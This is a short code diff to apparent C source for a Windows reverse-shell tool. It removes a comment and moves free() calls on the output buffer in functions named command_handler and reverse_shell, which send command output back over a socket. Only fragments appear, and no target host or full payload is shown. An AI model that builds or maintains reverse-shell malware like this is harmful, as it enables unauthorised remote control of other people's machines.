@@ -2,10 +2,6 @@
 
 int is_command(char * cmd)
 {
-    /*
-     * Do not forget to indent properly or the compiler will show a warning
-     * only tabs here
-     */
     if(my_strcmp(cmd, "exit\n"))
         return 1;
     if(cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ')
@@ -33,8 +29,8 @@ DWORD WINAPI command_handler(void *inf)
             sprintf(m_s->buf, "....");
         }
         sender(m_s->s, m_s->buf, strlen(m_s->buf), &m_s->cn);		// send output
-        free(m_s->buf);                       // free the allocated output.
     }
+    free(m_s->buf);                       // free the allocated output.
     return 0;
 }
 
@@ -53,7 +49,6 @@ int reverse_shell(struct main_struct *m_s)
             sleep(1);               // wait for 1 second for cmd to process after reading again.
                                     // this part should be a wait for thread
         }
-        free(m_s->buf);                             // free buffer memory
     }
     return 0;
 }
